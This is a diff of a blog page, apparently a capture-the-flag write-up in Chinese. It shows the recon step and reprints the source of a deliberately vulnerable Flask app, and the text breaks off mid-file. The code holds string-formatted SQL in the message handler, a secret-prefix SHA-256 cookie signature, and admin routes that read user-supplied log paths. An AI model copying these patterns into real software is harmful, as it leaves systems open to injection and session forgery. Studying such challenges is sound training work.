@@ -468,66 +468,789 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>第一部分先是nmap扫描,发现只开了22,80端口。那就直接从web下手。</p>
 <p>访问到页面后发现更加直接了。题目给了我们关键信息说网站是开源的,下载src.zip直接得app源码。那就愉快的审计了。</p>
 <p>主体代码<br>app.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, g, redirect, url_for,\</span><br><span class="line">    make_response</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> get_db, get_session, get_user, try_login, query_db, badword_in_str</span><br><span class="line"><span class="keyword">from</span> admin <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> lwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.register_blueprint(admin)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_connection</span><span class="params">(exception)</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/submit', methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">()</span>:</span></span><br><span class="line">    session = get_session(request)</span><br><span class="line">    <span class="keyword">if</span> session:</span><br><span class="line">        user = get_user(session[<span class="string">"username"</span>], session[<span class="string">"secret"</span>])</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"submit.html"</span>, page=<span class="string">"submit"</span>, user=user)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"submit.html"</span>, page=<span class="string">"submit"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/submitmessage", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submitmessage</span><span class="params">()</span>:</span></span><br><span class="line">    message = request.form.get(<span class="string">"message"</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> len(message) &gt; <span class="number">140</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"message too long"</span></span><br><span class="line">    <span class="keyword">if</span> badword_in_str(message):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"forbidden word in message"</span></span><br><span class="line">    <span class="comment"># insert new message in DB</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        query_db(<span class="string">"insert into messages values ('%s')"</span> %message)</span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> str(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"OK"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/login", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>, page=<span class="string">"login"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/postlogin", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">postlogin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># return user's info if exists</span></span><br><span class="line">    data = try_login(request.form)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        resp = make_response(<span class="string">"OK"</span>)</span><br><span class="line">        <span class="comment"># create new cookie session to authenticate user</span></span><br><span class="line">        session = lwt.create_session(data)</span><br><span class="line">        print(session)</span><br><span class="line">        cookie = lwt.create_cookie(session)</span><br><span class="line">        resp.set_cookie(<span class="string">"auth"</span>, cookie)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Login failed"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/logout")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(<span class="string">"&lt;script&gt;document.location.href='/';&lt;/script&gt;"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"auth"</span>, <span class="string">""</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="meta">@app.route("/home")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session = get_session(request)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> <span class="string">"username"</span> <span class="keyword">in</span> session:</span><br><span class="line">        user = get_user(session[<span class="string">"username"</span>], session[<span class="string">"secret"</span>])</span><br><span class="line">        print(user)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>, page=<span class="string">"home"</span>, user=user)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>, page=<span class="string">"home"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from flask import Flask, request, render_template, g, redirect, url_for,\
+    make_response
+from utils import get_db, get_session, get_user, try_login, query_db, badword_in_str
+from admin import admin
+import sqlite3
+import lwt
 
+
+app = Flask(__name__)
+
+app.register_blueprint(admin)
+
+
+@app.teardown_appcontext
+def close_connection(exception):
+    db = getattr(g, &#39;_database&#39;, None)
+    if db is not None:
+        db.close()
+
+
+@app.route(&#39;/submit&#39;, methods=[&quot;GET&quot;])
+def submit():
+    session = get_session(request)
+    if session:
+        user = get_user(session[&quot;username&quot;], session[&quot;secret&quot;])
+        return render_template(&quot;submit.html&quot;, page=&quot;submit&quot;, user=user)
+    return render_template(&quot;submit.html&quot;, page=&quot;submit&quot;)
+
+
+@app.route(&quot;/submitmessage&quot;, methods=[&quot;POST&quot;])
+def submitmessage():
+    message = request.form.get(&quot;message&quot;, &#39;&#39;)
+    if len(message) &gt; 140:
+        return &quot;message too long&quot;
+    if badword_in_str(message):
+        return &quot;forbidden word in message&quot;
+    # insert new message in DB
+    try:
+        query_db(&quot;insert into messages values (&#39;%s&#39;)&quot; %message)
+    except sqlite3.Error as e:
+        return str(e)
+    return &quot;OK&quot;
+
+
+@app.route(&quot;/login&quot;, methods=[&quot;GET&quot;])
+def login():
+    return render_template(&quot;login.html&quot;, page=&quot;login&quot;)
+
+
+@app.route(&quot;/postlogin&quot;, methods=[&quot;POST&quot;])
+def postlogin():
+    # return user&#39;s info if exists
+    data = try_login(request.form)
+    if data:
+        resp = make_response(&quot;OK&quot;)
+        # create new cookie session to authenticate user
+        session = lwt.create_session(data)
+        print(session)
+        cookie = lwt.create_cookie(session)
+        resp.set_cookie(&quot;auth&quot;, cookie)
+        return resp
+    return &quot;Login failed&quot;
+
+
+@app.route(&quot;/logout&quot;)
+def logout():
+    resp = make_response(&quot;&lt;script&gt;document.location.href=&#39;/&#39;;&lt;/script&gt;&quot;)
+    resp.set_cookie(&quot;auth&quot;, &quot;&quot;, expires=0)
+    return resp
+
+
+@app.route(&quot;/&quot;)
+@app.route(&quot;/home&quot;)
+def index():
+    session = get_session(request)
+    if session and &quot;username&quot; in session:
+        user = get_user(session[&quot;username&quot;], session[&quot;secret&quot;])
+        print(user)
+        return render_template(&quot;home.html&quot;, page=&quot;home&quot;, user=user)
+    return render_template(&quot;home.html&quot;, page=&quot;home&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(&#39;0.0.0.0&#39;,5000)</code></pre>
 <p>admin.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, render_template, request, redirect, abort</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> is_admin, admin_view_log, admin_list_log</span><br><span class="line"></span><br><span class="line">admin = Blueprint(<span class="string">'admin'</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.route("/admin")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_home</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin(request):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"admin.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.route("/admin/log/view", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_log</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin(request):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    logfile = request.form.get(<span class="string">"logfile"</span>)</span><br><span class="line">    <span class="keyword">if</span> logfile:</span><br><span class="line">        logcontent = admin_view_log(logfile)</span><br><span class="line">        <span class="keyword">return</span> logcontent</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.route("/admin/log/dir", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_log</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin(request):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    logdir = request.form.get(<span class="string">"logdir"</span>)</span><br><span class="line">    <span class="keyword">if</span> logdir:</span><br><span class="line">        logdir = admin_list_log(logdir)</span><br><span class="line">        <span class="keyword">return</span> str(logdir)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">from flask import Blueprint, render_template, request, redirect, abort
+from utils import is_admin, admin_view_log, admin_list_log
+
+admin = Blueprint(&#39;admin&#39;, __name__)
+
+
+@admin.route(&quot;/admin&quot;)
+def admin_home():
+    if not is_admin(request):
+        abort(403)
+    return render_template(&quot;admin.html&quot;)
+
+
+@admin.route(&quot;/admin/log/view&quot;, methods=[&quot;POST&quot;])
+def view_log():
+    if not is_admin(request):
+        abort(403)
+    logfile = request.form.get(&quot;logfile&quot;)
+    if logfile:
+        logcontent = admin_view_log(logfile)
+        return logcontent
+    return &#39;&#39;
+
+
+@admin.route(&quot;/admin/log/dir&quot;, methods=[&quot;POST&quot;])
+def list_log():
+    if not is_admin(request):
+        abort(403)
+    logdir = request.form.get(&quot;logdir&quot;)
+    if logdir:
+        logdir = admin_list_log(logdir)
+        return str(logdir)
+    return &#39;&#39;
+</code></pre>
 <p>lwt.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">SECRET = os.urandom(randrange(<span class="number">8</span>, <span class="number">15</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvalidSignature</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="string">""" Sign message with secret key """</span></span><br><span class="line">    <span class="keyword">return</span> sha256(SECRET + msg).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verif_signature</span><span class="params">(data, sig)</span>:</span></span><br><span class="line">    <span class="string">""" Verify if the supplied signature is valid """</span></span><br><span class="line">    <span class="keyword">return</span> sign(data) == sig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_session</span><span class="params">(cookie)</span>:</span></span><br><span class="line">    <span class="string">""" Parse cookie and return dict</span></span><br><span class="line"><span class="string">        @cookie: "key1=value1;key2=value2"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return &#123;"key1":"value1","key2":"value2"&#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    b64_data, b64_sig = cookie.split(<span class="string">'.'</span>)</span><br><span class="line">    data = b64decode(b64_data)</span><br><span class="line">    sig = b64decode(b64_sig)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> verif_signature(data, sig):</span><br><span class="line">        <span class="keyword">raise</span> InvalidSignature</span><br><span class="line">    info = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> group <span class="keyword">in</span> data.split(<span class="string">b';'</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> group:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            key, val = group.split(<span class="string">b'='</span>)</span><br><span class="line">            info[key.decode()] = val</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_session</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="string">""" Create session based on dict</span></span><br><span class="line"><span class="string">        @data: &#123;"key1":"value1","key2":"value2"&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return "key1=value1;key2=value2;"</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    session = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> data.items():</span><br><span class="line">        session += <span class="string">f"<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;v&#125;</span>;"</span></span><br><span class="line">    <span class="keyword">return</span> session.encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_cookie</span><span class="params">(session)</span>:</span></span><br><span class="line">    cookie_sig = sign(session)</span><br><span class="line">    print(cookie_sig)</span><br><span class="line">    <span class="keyword">return</span> b64encode(session) + <span class="string">b'.'</span> + b64encode(cookie_sig)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from hashlib import sha256
+from base64 import b64decode, b64encode
+from random import randrange
+import os
 
+SECRET = os.urandom(randrange(8, 15))
+
+
+class InvalidSignature(Exception):
+    pass
+
+
+def sign(msg):
+    &quot;&quot;&quot; Sign message with secret key &quot;&quot;&quot;
+    return sha256(SECRET + msg).digest()
+
+
+def verif_signature(data, sig):
+    &quot;&quot;&quot; Verify if the supplied signature is valid &quot;&quot;&quot;
+    return sign(data) == sig
+
+
+def parse_session(cookie):
+    &quot;&quot;&quot; Parse cookie and return dict
+        @cookie: &quot;key1=value1;key2=value2&quot;
+
+        return {&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;}
+    &quot;&quot;&quot;
+    b64_data, b64_sig = cookie.split(&#39;.&#39;)
+    data = b64decode(b64_data)
+    sig = b64decode(b64_sig)
+    if not verif_signature(data, sig):
+        raise InvalidSignature
+    info = {}
+    for group in data.split(b&#39;;&#39;):
+        try:
+            if not group:
+                continue
+            key, val = group.split(b&#39;=&#39;)
+            info[key.decode()] = val
+        except Exception:
+            continue
+    return info
+
+
+def create_session(data):
+    &quot;&quot;&quot; Create session based on dict
+        @data: {&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;}
+
+        return &quot;key1=value1;key2=value2;&quot;
+    &quot;&quot;&quot;
+    session = &quot;&quot;
+    for k, v in data.items():
+        session += f&quot;{k}={v};&quot;
+    return session.encode()
+
+
+def create_cookie(session):
+    cookie_sig = sign(session)
+    print(cookie_sig)
+    return b64encode(session) + b&#39;.&#39; + b64encode(cookie_sig)
+</code></pre>
 <p>utils.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lwt</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> g</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir, path</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DATABASE = <span class="string">"database.db"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User(username=%s,role=%d)"</span> % (self.username,self.role)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db</span><span class="params">()</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(DATABASE)</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_login</span><span class="params">(user)</span>:</span></span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    d = now.strftime(<span class="string">"%Y-%m-%d"</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">f"logs/<span class="subst">&#123;d&#125;</span>.log"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> log:</span><br><span class="line">        log.write(str(user) + <span class="string">' logged\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">badword_in_str</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = data.lower()</span><br><span class="line">    badwords = [<span class="string">"rand"</span>, <span class="string">"system"</span>, <span class="string">"exec"</span>, <span class="string">"date"</span>]</span><br><span class="line">    <span class="keyword">for</span> badword <span class="keyword">in</span> badwords:</span><br><span class="line">        <span class="keyword">if</span> badword <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_password</span><span class="params">(password)</span>:</span></span><br><span class="line">    <span class="string">""" Hash password with a secure hashing function """</span></span><br><span class="line">    <span class="keyword">return</span> sha256(password.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_db</span><span class="params">(query, args=<span class="params">()</span>, one=False)</span>:</span></span><br><span class="line">    cur = get_db().execute(query, args)</span><br><span class="line">    rv = cur.fetchall()</span><br><span class="line">    cur.close()</span><br><span class="line">    <span class="keyword">return</span> (rv[<span class="number">0</span>] <span class="keyword">if</span> rv <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">if</span> one <span class="keyword">else</span> rv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user</span><span class="params">(username, secret)</span>:</span></span><br><span class="line">    <span class="string">""" Returns User object if given username/secret exist in DB """</span></span><br><span class="line">    username = username.decode()</span><br><span class="line">    secret = secret.decode()</span><br><span class="line">    res = query_db(<span class="string">"select role from users where username = ? and secret = ?"</span>, (username, secret), one=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        user = User()</span><br><span class="line">        user.username = username</span><br><span class="line">        user.role = res[<span class="number">0</span>]</span><br><span class="line">        log_login(user)</span><br><span class="line">        <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_login</span><span class="params">(form)</span>:</span></span><br><span class="line">    <span class="string">""" Try to login with the submitted user info """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> form:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    username = form[<span class="string">"username"</span>]</span><br><span class="line">    password = hash_password(form[<span class="string">"password"</span>])</span><br><span class="line">    result = query_db(<span class="string">"select count(*) from users where username = ? and secret = ?"</span>, (username, password), one=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">and</span> result[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"username"</span>: username, <span class="string">"secret"</span>:password&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">""" Get user session and parse it """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.cookies:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">"auth"</span> <span class="keyword">not</span> <span class="keyword">in</span> request.cookies:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">"auth"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        info = lwt.parse_session(cookie)</span><br><span class="line">    <span class="keyword">except</span> lwt.InvalidSignature:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"status"</span>: <span class="number">-1</span>, <span class="string">"msg"</span>: <span class="string">"Invalid signature"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_admin</span><span class="params">(request)</span>:</span></span><br><span class="line">    session = get_session(request)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"username"</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> <span class="string">"secret"</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    user = get_user(session[<span class="string">"username"</span>], session[<span class="string">"secret"</span>])</span><br><span class="line">    <span class="keyword">return</span> user.role == <span class="number">1</span></span><br><span 